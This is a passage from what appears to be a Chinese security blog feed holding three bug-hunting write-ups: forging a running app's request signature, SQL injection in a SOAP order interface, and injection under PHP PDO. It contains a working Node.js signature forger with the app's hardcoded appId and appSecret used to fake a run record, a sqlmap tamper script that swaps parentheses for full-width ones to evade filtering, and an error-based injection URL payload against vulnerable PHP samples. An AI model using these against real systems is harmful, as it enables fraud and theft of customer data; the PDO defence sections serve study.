alt="md5解密sign"></p><p>GG了，看样厂商的安全意识不算太差~没有使用时间戳或者随机数加密后的值作为sign，导致sign可以被无脑遍历猜解</p><p>随后我们尝试第二种方法，置空sign值</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134750.png" alt="置空sign"></p><p>发现依然鉴权认证失败，gg了。</p><p>看样两种常规的对抗sign的方法已经废了，我们只能从app下手了，逆向尝试去寻找其sign的算法</p><h2 id="0x06-逆向apk文件取得其sign值算法"><a href="#0x06-逆向apk文件取得其sign值算法" class="headerlink" title="0x06 逆向apk文件取得其sign值算法"></a>0x06 逆向apk文件取得其sign值算法</h2><p>拿到程序apk直接查壳，运气不错，apk没加壳，省了不少功夫</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134862.png" alt="查壳"></p><p>直接将apk文件拖到jadx中，对其进行逆向分析</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134098.png" alt="jadx逆向"></p><p>全局搜素sign，在仔细挨个查看后，成功定位到了其sign生成的关键算法</p><p>代码过长，关键部分代码如下</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134337.png" alt="sign算法①"></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134437.png" alt="sign算法②"></p><p>可以看到，其sign值的签名算法为</p><p>创建一个链表, 将全部已有的参数加入进去, 然后再加上一些键值对(其中timestamp时间戳我们已知，appID，appSecret两个键值对我们均未知)</p><p>之后再将全部的键值对根据键的字母顺序进行排序, 之后使用 <code>querystring</code> 方式对键值对进行编码.</p><p>最后再对编码后的字符串求 <code>MD5</code> 值, 就是最终的签名了, 麻烦的一比</p><h2 id="0x07-继续逆向apk文件获取未知键值对"><a href="#0x07-继续逆向apk文件获取未知键值对" class="headerlink" title="0x07 继续逆向apk文件获取未知键值对"></a>0x07 继续逆向apk文件获取未知键值对</h2><p>我们继续来找appID，appSecret两个我们未知的键值对</p><p>发现其获取方法如下</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134569.png" alt="获取未知键值对"></p><p><strong>①appID键值对的获取方法:</strong></p><p>如果请求的url是 <a href="https://m.xxxxx.com/">https://m.xxxxx.com</a> 则为move，否则调用getAppId方法</p><p>后面我搜索了一下getAppId方法，发现其本质上是获取某接口openId的参数值，随后赋值给AppID</p><p>我去burpsuite走了一遍这个apk的业务，然后去http history搜索了一下openId,直接获取到了我们学校的openId参数值，也就是说我们获取到了AppID</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134671.png" alt="获取AppID"></p><p><strong>②appSceret键值对获取方法</strong></p><p>在jadx中提示appSecre键t对应的值来源于g.b，我们在import的包中成功找到了g.b（即appSecret）</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134802.png" alt="appSecret"></p><h2 id="0x08-Nodejs编写计算sign的Exploit"><a href="#0x08-Nodejs编写计算sign的Exploit" class="headerlink" title="0x08 Nodejs编写计算sign的Exploit"></a>0x08 Nodejs编写计算sign的Exploit</h2><p>sign的算法已经有了，未知的键值对我们也拿到了，下面就是直接编写计算sign的exploit的时刻啦~</p><p>我们选择用nodejs来还原整个sign的加密算法(注意，我们将formatSportRange跑步距离改为了5.003)</p><pre><code class="javascript">var parseQueryString = function( url )&#123;    var reg_url =/^[^\?]+\?([\w\W]+)$/,        reg_para=/([^&amp;=]+)=([\w\W]*?)(&amp;|$)/g, //g is very important        arr_url = reg_url.exec( url ),        ret        = &#123;&#125;;    if( arr_url &amp;&amp; arr_url[1] )&#123;        var str_para = arr_url[1],result;        while((result = reg_para.exec(str_para)) != null)&#123;            ret[result[1]] = result[2];        &#125;    &#125;    return ret;&#125;var url =&quot;www.xxx.com/index.php?userId=34263&amp;runType=2&amp;startTime=1635573372448&amp;endTime=1635573425940&amp;gitudeLatitude=%5B%7B%22latitude%22%3A34.383468%2C%22locationType%22%3A4%2C%22longitude%22%3A108.976148%2C%22puase%22%3Afalse%2C%22speed%22%3A0.0%2C%22time%22%3A1635573372480%7D%2C%7B%22latitude%22%3A34.383484%2C%22locationType%22%3A4%2C%22longitude%22%3A108.976155%2C%22puase%22%3Atrue%2C%22speed%22%3A0.0%2C%22time%22%3A1635573373314%7D%2C%7B%22latitude%22%3A34.383489%2C%22locationType%22%3A2%2C%22longitude%22%3A108.976155%2C%22puase%22%3Atrue%2C%22speed%22%3A1.55%2C%22time%22%3A1635573378344%7D%2C%7B%22latitude%22%3A34.383408%2C%22locationType%22%3A2%2C%22longitude%22%3A108.976193%2C%22puase%22%3Atrue%2C%22speed%22%3A1.55%2C%22time%22%3A1635573398400%7D%2C%7B%22latitude%22%3A34.383479%2C%22locationType%22%3A2%2C%22longitude%22%3A108.976152%2C%22puase%22%3Atrue%2C%22speed%22%3A1.55%2C%22time%22%3A1635573418403%7D%5D&amp;identify=12cc1557-f226-4d19-a01f-58f492620818&amp;formatSportTime=00%3A00%3A01&amp;formatSportRange=5.003&amp;avgspeed=0.0&amp;speed=0%270%22&amp;okPointList=%5B%5D&amp;brand=Xiaomi&amp;model=Mi%2010&amp;system=Android&amp;version=10&amp;appVersion=1.5.73&amp;stepNumbers=%5B0%5D&amp;isFaceStatus=0&amp;points=%5B%5D&amp;uploadType=0&amp;timestamp=1635573451940&quot;;var obj = parseQueryString(url);//console.log(obj)   //querystring序列化const crypto = require(&#39;crypto&#39;)const APP_ID = &quot;ec74df4f7ea14f1fb585bbc9f936fc23&quot;const data = objconsole.log(data)const timestamp = &#39;1635573451940&#39;function ff(data, timestamp, appId = APP_ID)&#123;  const d = &#123; ...data, appId, timestamp: &#39;1634356066432&#39;,appSecret: &#39;e8167ef026cbc5e456ab837d9d6d9254&#39; &#125;  const ans = crypto.createHash(&#39;md5&#39;).update(Object.keys(d).sort().map(k =&gt; k + &#39;=&#39; + d[k]).join(&#39;&amp;&#39;)).digest(&#39;hex&#39;)  console.log(&quot;sign is&quot;,ans)&#125;ff(data, timestamp, APP_ID)</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134886.png" alt="计算sign"></p><p>大功告成，我们成功序列化queryString后计算出了sign值，我们现在可以篡改任意数据并根据算法生成伪造的sign值</p><h2 id="0x09-测试"><a href="#0x09-测试" class="headerlink" title="0x09 测试"></a>0x09 测试</h2><p>我们将原来的formatSportRange跑步距离改为了从0.000修改为5.003，并使用程序生成的sign值</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134045.png" alt="image-20211030160329056"></p><p>如图，大功告成，跑步记录保存成功，我们成功使用伪造的sign签名增加了一条5.003 km的跑步记录</p><p>返回app查看~</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134137.png"></p><p>nice！</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134311.png"></p><h2 id="0x10-后言"><a href="#0x10-后言" class="headerlink" title="0x10 后言"></a>0x10 后言</h2><p>遇到可能的漏洞点莫要轻言放弃，再坚持一下，曙光就在前方~</p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192134984.gif" style="zoom:80%;" />]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重生之我是赏金猎人(一)-轻松get某src soap注入</title>
      <link href="/2021/08/19/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8%E8%A1%8C%E4%B8%9A%E8%AE%A8%E5%8F%A3%E5%AD%90-%E4%B8%80-%E8%BD%BB%E6%9D%BEget%E6%9F%90src-soap%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/08/19/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8%E8%A1%8C%E4%B8%9A%E8%AE%A8%E5%8F%A3%E5%AD%90-%E4%B8%80-%E8%BD%BB%E6%9D%BEget%E6%9F%90src-soap%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-挖掘过程"><a href="#0x01-挖掘过程" class="headerlink" title="0x01 挖掘过程"></a>0x01 挖掘过程</h2><p>在对某SRC测试时，本人根据其证书信息收集到了部分深度子域，并找到了其对应的业务IP段 写了个shell脚本+ffuf批量fuzz某src c段资产目录 </p><p>发现了xxSRC c段的一个提供了webservice的服务器 </p><p><a href="http://180.x.x.x/webservice/">http://180.x.x.x/webservice/</a></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192133741.png" alt="image-20230419210644326"></p><p>获取到接口<br><a href="http://180.x.x.x/webservice/syncOrderToOdcService">http://180.x.x.x/webservice/syncOrderToOdcService</a></p><p>使用soup ui 进行调试</p><p>数据</p><pre><code class="xml">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:odc=&quot;http://odc.ws.qiku.com/&quot;&gt;&lt;soapenv:Header/&gt;&lt;soapenv:Body&gt;&lt;odc:syncOrderInfo&gt;&lt;!--Optional:--&gt;&lt;arg0&gt;&lt;/arg0&gt;&lt;/odc:syncOrderInfo&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;&lt;arg0&gt;&lt;/arg0&gt;</code></pre><p>当<arg0></arg0>中间无参数值时</p><p>Soap接口抛出了一个Oracle的错误信息，并提示“Date format error,YY-MM-DD”</p><p>随后很简单了，构造一个符合条件的date数据</p><pre><code>2021-9-23</code></pre><p>Soap request：</p><pre><code class="xml">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:odc=&quot;http://odc.ws.qiku.com/&quot;&gt;&lt;soapenv:Header/&gt;&lt;soapenv:Body&gt;&lt;odc:syncOrderInfo&gt;&lt;!--Optional:--&gt;&lt;arg0&gt;2021-9-23&lt;/arg0&gt;&lt;/odc:syncOrderInfo&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</code></pre><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192133888.png" alt="image-20230419210707743"></p><p>arg0处为日期参数，指定日期，即可查询到xx src商城所有订单信息</p><p>属于严重泄露客户数据的漏洞</p><h2 id="0x03-Soap接口的注入"><a href="#0x03-Soap接口的注入" class="headerlink" title="0x03 Soap接口的注入"></a>0x03 Soap接口的注入</h2><p>看了一下oracle都爆出SQL的错误信息了，并且没有预编译相关的提示，这不得注入一波？</p><p>但是在注入的时候发现程序会将括号()过滤掉，导致函数无法执行，sqlmap注入不出来</p><p>这时候就要用到骚姿势了</p><p>在Oracle中,中文括号（）可以代替英文()而且不报错！</p><p>EG:</p><pre><code># 纯中文括号SQL&gt; select （1+1） from dual;   （1+1）----------         2</code></pre><p>剩下的就很简单了，改一个tamper出来</p><pre><code class="python">#!/usr/bin/env python&quot;&quot;&quot;Copyright (c) 2006-2016 sqlmap developers ([url]http://sqlmap.org/[/url])See the file &#39;doc/COPYING&#39; for copying permission&quot;&quot;&quot;import osimport refrom lib.core.common import singleTimeWarnMessagefrom lib.core.enums import DBMSfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.HIGHESTdef dependencies():    singleTimeWarnMessage(&quot;tamper script &#39;%s&#39; is unlikely to work against %s&quot; % (os.path.basename(__file__).split(&quot;.&quot;)[0], DBMS.PGSQL))def tamper(payload, **kwargs):    retVal = payload    if payload:        retVal = re.sub(r&quot;\s*(\s*&quot;, &quot;（&quot;, retVal)retVal = re.sub(r&quot;\s*)\s*&quot;, &quot;）&quot;, retVal)return retVal</code></pre><blockquote><blockquote><p>python sqlmap.py -r xxx.txt –dbs –tamper&#x3D;brackets.py  &#x2F;&#x2F;注入请求，在日期处加*</p></blockquote></blockquote><p>w到手，收摊</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192133987.png" alt="image-20230419210733294"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从PDO下的注入思路到获得Git 3000star项目0day</title>
      <link href="/2021/05/25/%E4%BB%8EPDO%E4%B8%8B%E7%9A%84%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF%E5%88%B0%E8%8E%B7%E5%BE%97Git-3000star%E9%A1%B9%E7%9B%AE0day/"/>
      <url>/2021/05/25/%E4%BB%8EPDO%E4%B8%8B%E7%9A%84%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF%E5%88%B0%E8%8E%B7%E5%BE%97Git-3000star%E9%A1%B9%E7%9B%AE0day/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-PDO简介"><a href="#0x01-PDO简介" class="headerlink" title="0x01 PDO简介"></a>0x01 PDO简介</h2><p>PDO全名PHP Data Object</p><p>PDO扩展为PHP访问数据库定义了一个轻量级的一致接口。PDO提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以使用相同的函数（方法）来查询和获取数据。</p><p>PHP连接MySQL数据库有三种方式（MySQL、Mysqli、PDO），列表性比较如下：</p><table><thead><tr><th></th><th>Mysqli</th><th>PDO</th><th>MySQL</th></tr></thead><tbody><tr><td>引入的PHP版本</td><td>5.0</td><td>5.0</td><td>3.0之前</td></tr><tr><td>PHP5.x是否包含</td><td>是</td><td>是</td><td>是</td></tr><tr><td>服务端prepare语句的支持情况</td><td>是</td><td>是</td><td>否</td></tr><tr><td>客户端prepare语句的支持情况</td><td>否</td><td>是</td><td>否</td></tr><tr><td>存储过程支持情况</td><td>是</td><td>是</td><td>否</td></tr><tr><td>多语句执行支持情况</td><td>是</td><td>大多数</td><td>否</td></tr></tbody></table><p>如需在php中使用pdo扩展，需要在php.ini文件中进行配置</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191640774.png" alt="image"></p><h2 id="0x02-PDO防范SQL注入"><a href="#0x02-PDO防范SQL注入" class="headerlink" title="0x02 PDO防范SQL注入"></a>0x02 PDO防范SQL注入</h2><h3 id="①调用方法转义特殊字符"><a href="#①调用方法转义特殊字符" class="headerlink" title="①调用方法转义特殊字符"></a>①调用方法转义特殊字符</h3><p><strong>quote()方法(这种方法的原理跟addslashes差不多，都是转义)</strong></p><p>PDO类库的quate()方法会将输入字符串（如果需要）周围加上引号，并在输入字符串内转义特殊字符。</p><p>EG①:</p><pre><code class="PHP">&lt;?php$conn = new PDO(&#39;sqlite:/home/lynn/music.sql3&#39;);/* Dangerous string */$string = &#39;Naughty &#39; string&#39;;print &quot;Unquoted string: $stringn&quot;;print &quot;Quoted string:&quot; . $conn-&gt;quote($string) . &quot;n&quot;;?&gt;</code></pre><p>输出</p><pre><code class="php">Unquoted string: Naughty &#39; stringQuoted string: &#39;Naughty &#39;&#39; string&#39;</code></pre><p>EG②</p><p>test.sql</p><pre><code>SET NAMES utf8mb4;SET FOREIGN_KEY_CHECKS = 0;-- ------------------------------ Table structure for user-- ----------------------------DROP TABLE IF EXISTS `user`;CREATE TABLE `user`  (  `id` int(10) NOT NULL,  `username` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NULL DEFAULT NULL,  `password` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NULL DEFAULT NULL) ENGINE = MyISAM CHARACTER SET = utf8 COLLATE = utf8_unicode_ci ROW_FORMAT = Dynamic;-- ------------------------------ Records of user-- ----------------------------INSERT INTO `user` VALUES (0, &#39;admin&#39;, &#39;admin&#39;);INSERT INTO `user` VALUES (1, &#39;user&#39;, &#39;user&#39;);SET FOREIGN_KEY_CHECKS = 1;</code></pre><p>pdo.php</p><pre><code class="php">&lt;?phpheader(&#39;content-type=text/html;charset=utf-8&#39;);$username=$_GET[&#39;username&#39;];$password=$_GET[&#39;password&#39;];try&#123;    $pdo=new PDO(&#39;mysql:host=localhost;dbname=test&#39;,&#39;root&#39;,&#39;root&#39;);     $username=$pdo-&gt;quote($username);     $password=$pdo-&gt;quote($password);    $sql=&quot;select * from user where username=&#123;$username&#125; and password=&#123;$password&#125;&quot;;    echo $sql.&quot;&lt;/br&gt;&quot;;    $row=$pdo-&gt;query($sql);    foreach ($row as $key =&gt; $value) &#123;        print_r($value);    &#125;&#125;catch(POOException $e)&#123;    echo $e-&gt;getMessage();&#125;</code></pre><p>访问<a href="http://localhost/pdo.php?username=admin&password=admin">http://localhost/pdo.php?username=admin&amp;password=admin</a></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191640915.png" alt="image"></p><p>当我们使用单引号探测注入时</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191640974.png" alt="image"></p><p>如图，单引号已被反斜线转义</p><h3 id="②预编译语句"><a href="#②预编译语句" class="headerlink" title="②预编译语句"></a>②<strong>预编译语句</strong></h3><p><strong>1、占位符-通过命名参数防止注入</strong></p><p>通过命名参数防止注入的方法会使得程序在执行SQL语句时，将会把参数值当成一个字符串整体来进行处理，即使参数值中包含单引号，也会把单引号当成单引号字符，而不是字符串的起止符。这样就在某种程度上消除了SQL注入攻击的条件。</p><p>将原来的SQL查询语句改为</p><pre><code>Select * from where name=:username and password=:password</code></pre><p>prepare方法进行SQL语句预编译</p><p>最后通过调用rowCount()方法，查看返回受sql语句影响的行数</p><p>返回0语句执行失败，大于等于1，则表示语句执行成功。</p><p>All code</p><pre><code>&lt;?phpheader(&#39;content-type:text/html;charset=utf-8&#39;);$username=$_GET[&#39;username&#39;];$password=$_GET[&#39;password&#39;];try&#123;    $pdo=new PDO(&#39;mysql:host=localhost;dbname=test&#39;,&#39;root&#39;,&#39;root&#39;);    $sql=&#39;select * from user where name=:username and password=:password&#39;;    $stmt=$pdo-&gt;prepare($sql);    $stmt-&gt;execute(array(&quot;:username&quot;=&gt;$username,&quot;:password&quot;=&gt;$password));    echo $stmt-&gt;rowCount();&#125;catch(PDOException $e)&#123;    echo $e-&gt;getMessage();&#125;?&gt;</code></pre><p>查询成功</p><p><img src="https://i.loli.net/2021/05/25/JED7sFeOK2BY5ja.png" alt="查询成功"></p><p>注入失败</p><p><img src="https://i.loli.net/2021/05/25/spihC8eVbXfczBU.png" alt="image-20210525140039170"></p><p><strong>2、占位符-通过问号占位符防止注入</strong></p><p>把SQL语句再进行修改</p><pre><code class="sql">select * from user where name=? and password=?</code></pre><p>同上，prepare方法进行SQL语句预编译</p><p>最后调用rowCount()方法，查看返回受sql语句影响的行数</p><pre><code class="php">&lt;?header(&#39;content-type:text/html;charset=utf-8&#39;);$username=$_GET[&#39;username&#39;];$password=$_GET[&#39;password&#39;];try&#123;    $pdo=new PDO(&#39;mysql:host=localhost;dbname=test&#39;,&#39;root&#39;,&#39;root&#39;);    $sql=&quot;select * from user where username=? and password=?&quot;;    $stmt=$pdo-&gt;prepare($sql);    $stmt-&gt;execute(array($username,$password));    echo $stmt-&gt;rowCount();&#125;catch(PDOException $e)&#123;    echo $e-&gt;getMessage();&#125;?&gt;</code></pre><p>效果同上</p><p>查询成功</p><p><img src="https://i.loli.net/2021/05/25/JED7sFeOK2BY5ja.png" alt="查询成功"></p><p>注入失败</p><p><img src="https://i.loli.net/2021/05/25/spihC8eVbXfczBU.png" alt="image-20210525140039170"></p><p><strong>3.通过bindParam()方法绑定参数防御SQL注入</strong></p><p>修改语句部分</p><pre><code class="php">$sql=&#39;select * from user where name=:username and password=:password&#39;;    $stmt=$pdo-&gt;prepare($sql);    $stmt-&gt;bindParam(&quot;:username&quot;,$username,PDO::PARAM_STR);    $stmt-&gt;bindParam(&quot;:password&quot;,$password,PDO::PARAM_STR);</code></pre><p><strong>解释：</strong><br>a)：:username 和 :password为命名参数<br>b)：$username;$password为获取的变量，即用户名和密码。<br>c)：PDO::PARAM_STR,表示参数变量的值一定要为字符串，即绑定参数类型为字符串。在bindparam()方法中，默认绑定的参数类型就是字符串。</p><p>​       当你要接受int型数据的时候可以绑定参数为PDO::PARAM_INT.</p><pre><code class="php">&lt;?phpheader(&#39;content-type:text/html;charset=utf-8&#39;);$username=$_GET[&#39;username&#39;];$password=$_GETT[&#39;password&#39;];try&#123;    $pdo=new PDO(&#39;mysql:host=localhost;dbname=test&#39;,&#39;root&#39;,&#39;root&#39;);    $sql=&#39;select * from user where name=:username and password=:password&#39;;    $stmt=$pdo-&gt;prepare($sql);    $stmt-&gt;bindParam(&quot;:username&quot;,$username,PDO::PARAM_STR);    $stmt-&gt;bindParam(&quot;:password&quot;,$password,PDO::PARAM_STR);    $stmt-&gt;execute();    echo $stmt-&gt;rowCount();&#125;catch(PDOException $e)&#123;    echo $e-&gt;getMessage();&#125;?&gt;</code></pre><p>效果同上</p><p>查询成功</p><p><img src="https://i.loli.net/2021/05/25/JED7sFeOK2BY5ja.png" alt="查询成功"></p><p>注入失败</p><p><img src="https://i.loli.net/2021/05/25/spihC8eVbXfczBU.png" alt="image-20210525140039170"></p><p>这只是总结了一部分PDO防范SQL注入的方法，仍有方法请见下文</p><p>其他手法还有很多，大家感兴趣的话可以自行研究</p><h2 id="0x03-PDO下的注入手法与思考"><a href="#0x03-PDO下的注入手法与思考" class="headerlink" title="0x03 PDO下的注入手法与思考"></a>0x03 PDO下的注入手法与思考</h2><p>读完前文后，读者们可能不由感叹，真狠啊，什么都tmd转义，什么语句都预编译了，这我tmd注入个毛…</p><p><img src="https://i.loli.net/2021/05/25/k3VIpq2GndYDKhg.png" alt="image-20210525143226397"></p><p><img src="https://i.loli.net/2021/05/25/mgUREqoKWj2Lc1O.jpg" alt="img"></p><p>北宋宰相王安石有言“看似寻常最奇崛,成如容易却艰辛”</p><p>让我们抽丝剥茧来探寻PDO下的注入手法</p><p>目前在PDO下，比较通用的手法主要有如下两种</p><h3 id="①宽字节注入"><a href="#①宽字节注入" class="headerlink" title="①宽字节注入"></a><strong>①宽字节注入</strong></h3><p>注入的原理就不讲了，相信大家都知道</p><p>一张图，清晰明了</p><p><img src="https://i.loli.net/2021/05/25/Vl2qxBSFykeNp5h.png" alt="image-20210525144401689"></p><p>当Mysql数据库my.ini文件中设置编码为gbk时，</p><p>我们的PHP程序哪怕使用了addslashes()，PDO::quote，mysql_real_escape_string()、mysql_escape_string()等函数、方法，或配置了magic_quotes_gpc&#x3D;on，依然可以通过构造%df’的方法绕过转义</p><h3 id="②堆叠注入与报错注入"><a href="#②堆叠注入与报错注入" class="headerlink" title="②堆叠注入与报错注入"></a>②堆叠注入与报错注入</h3><p>PDO分为<strong>模拟预处理</strong>和<strong>非模拟预处理</strong>。</p><p><strong>模拟预处理是防止某些数据库不支持预处理而设置的，也是众多注入的元凶</strong></p><p>在初始化PDO驱动时，可以设置一项参数，PDO::ATTR_EMULATE_PREPARES，作用是打开模拟预处理(true)或者关闭(false),默认为true。</p><p>PDO内部会模拟参数绑定的过程，SQL语句是在最后execute()的时候才发送给数据库执行。</p><p><strong>非模拟预处理则是通过数据库服务器来进行预处理动作，主要分为两步：</strong></p><p>第一步是prepare阶段，发送SQL语句模板到数据库服务器；</p><p>第二步通过execute()函数发送占位符参数给数据库服务器执行。</p><p><strong>PDO产生安全问题的主要设置如下：</strong></p><blockquote><p>​    PDO::ATTR_EMULATE_PREPARES    &#x2F;&#x2F;模拟预处理(默认开启)</p><p>​    PDO::ATTR_ERRMODE      &#x2F;&#x2F;报错</p><p>​    PDO::MYSQL_ATTR_MULTI_STATEMENTS      &#x2F;&#x2F;允许多句执行(默认开启)</p></blockquote><p>PDO默认是允许多句执行和模拟预编译的，在用户输入参数可控的情况下，会导致堆叠注入。</p><h4 id="2-1-没有过滤的堆叠注入情况"><a href="#2-1-没有过滤的堆叠注入情况" class="headerlink" title="2.1 没有过滤的堆叠注入情况"></a>2.1 没有过滤的堆叠注入情况</h4><pre><code class="php">&lt;?phpheader(&#39;content-type=text/html;charset=utf-8&#39;);$username=$_GET[&#39;username&#39;];$password=$_GET[&#39;password&#39;];try&#123;    $pdo=new PDO(&#39;mysql:host=localhost;dbname=test&#39;,&#39;root&#39;,&#39;root&#39;);    $sql=&quot;select * from user where username=&#39;&#123;$username&#125;&#39; and password=&#39;&#123;$password&#125;&#39;&quot;;    echo $sql.&quot;&lt;/br&gt;&quot;;    $row=$pdo-&gt;query($sql);    foreach ($row as $key =&gt; $value) &#123;        print_r($value);    &#125;&#125;catch(POOException $e)&#123;    echo $e-&gt;getMessage();&#125;</code></pre><p>因为在$pdo&gt;query()执行之前，我们便可以对$sql进行非法操作，那PDO相当于没用</p><p><img src="https://i.loli.net/2021/05/25/iRY4JqCXH3TBZt1.png" alt="image-20210525161109702"></p><p><img src="https://i.loli.net/2021/05/25/zfiamDTkusvMg45.png" alt="image-20210525160856876"></p><p>如果想禁止多语句执行，可在创建PDO实例时将PDO::MYSQL_ATTR_MULTI_STATEMENTS设置为false</p><pre><code class="php">new PDO($dsn, $user, $pass, array(PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; false))</code></pre><p>但是哪怕禁止了多语句执行，也只是防范了堆叠注入而已，直接union即可</p><p><img src="https://i.loli.net/2021/05/25/qMptNExXKOeD27k.png" alt="image-20210525191231332"></p><h4 id="2-2-模拟预处理的情况"><a href="#2-2-模拟预处理的情况" class="headerlink" title="2.2 模拟预处理的情况"></a>2.2 模拟预处理的情况</h4><pre><code class="php">&lt;?phptry &#123;    $pdo=new PDO(&#39;mysql:host=localhost;dbname=test&#39;,&#39;root&#39;,&#39;root&#39;);    //$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);    $username = $_GET[&#39;username&#39;];    $sql = &quot;select id,&quot;.$_GET[&#39;role&#39;].&quot; from user where username = ?&quot;;    $stmt = $pdo-&gt;prepare($sql);    $stmt-&gt;bindParam(1,$username);    $stmt-&gt;execute();    while($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC))    &#123;        var_dump($row);        echo &quot;&lt;br&gt;&quot;;    &#125;&#125; catch (PDOException $e) &#123;    echo $e;&#125;</code></pre><p>$role是可控的，导致可实现堆叠注入和in line query</p><p><img src="https://i.loli.net/2021/05/26/IbQoJZMV3BEW8xa.png" alt="image-20210526015752434"></p><p><img src="https://i.loli.net/2021/05/26/uxRIAn8C9gWVG5B.png" alt="image-20210526005239112"></p><h4 id="2-3当设置PDO-ATTR-ERRMODE和PDO-ERRMODE-EXCEPTION开启报错时"><a href="#2-3当设置PDO-ATTR-ERRMODE和PDO-ERRMODE-EXCEPTION开启报错时" class="headerlink" title="2.3当设置PDO::ATTR_ERRMODE和PDO::ERRMODE_EXCEPTION开启报错时"></a>2.3当设置PDO::ATTR_ERRMODE和PDO::ERRMODE_EXCEPTION开启报错时</h4><p>设置方法</p><pre><code class="php">$pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</code></pre><p>无论是否开启PDO::ATTR_EMULATE_PREPARES-模拟预处理</p><p>此时SQL语句如果产生报错，PDO则会将报错抛出</p><p>除设置错误码之外，PDO 还将抛出一个 PDOException 异常类并设置它的属性来反射错误码和错误信息。</p><p>此设置在调试期间也非常有用，因为它会有效地放大脚本中产生错误的点，从而可以非常快速地指出代码中有问题的潜在区域</p><p>在这种情况下可以实现error-based SQL Injection</p><p>使用GTID_SUBSET函数进行报错注入</p><pre><code class="sql">http://192.168.1.3/pdo.php?role=id OR GTID_SUBSET(CONCAT((MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),1,190))),6700)&amp;username=admin&amp;username=admin</code></pre><p><img src="https://i.loli.net/2021/05/26/1D5nIJ8tQVkAOHU.png" alt="image-20210526013121010"></p><h4 id="2-4-非模拟预处理的情况"><a href="#2-4-非模拟预处理的情况" class="headerlink" title="2.4 非模拟预处理的情况"></a>2.4 非模拟预处理的情况</h4><pre><code class="php">&lt;?phptry &#123;    $pdo=new PDO(&#39;mysql:host=localhost;dbname=test&#39;,&#39;root&#39;,&#39;root&#39;);    $pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);    $pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);    $username = $_GET[&#39;username&#39;];    $sql = &quot;select id,&quot;.$_GET[&#39;role&#39;].&quot; from user where username = ?&quot;;    $stmt = $pdo-&gt;prepare($sql);    $stmt-&gt;bindParam(1,$username);    $stmt-&gt;execute();    while($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC))    &#123;        var_dump($row);        echo &quot;&lt;br&gt;&quot;;    &#125;&#125; catch (PDOException $e) &#123;    echo $e;&#125;</code></pre><p>此时堆叠注入已经歇逼</p><p><img src="https://i.loli.net/2021/05/26/6AfJC7pE42OZU9I.png" alt="image-20210526015916363"></p><p>但inline query，报错注入依然坚挺可用</p><p><img src="https://i.loli.net/2021/05/26/rNZXVoWfLQed74n.png" alt="image-20210526014840025"></p><h3 id="③一个安全的case"><a href="#③一个安全的case" class="headerlink" title="③一个安全的case"></a>③一个安全的case</h3><p>只要语句内存在有用户非纯字符可控部分，便不够安全；那我们就用非模拟预处理sql写法</p><pre><code class="php">$dbh-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false); </code></pre><p>它会告诉 PDO 禁用模拟预处理语句，并使用 real parepared statements 。</p><p>这可以确保SQL语句和相应的值在传递到mysql服务器之前是不会被PHP解析的（禁止了所有可能的恶意SQL注入攻击）。</p><p>如下为一个安全使用PDO的case</p><pre><code class="php">$pdo = new PDO(&#39;mysql:dbname=testdatabase;host=localhost;charset=utf8&#39;, &#39;root&#39;, 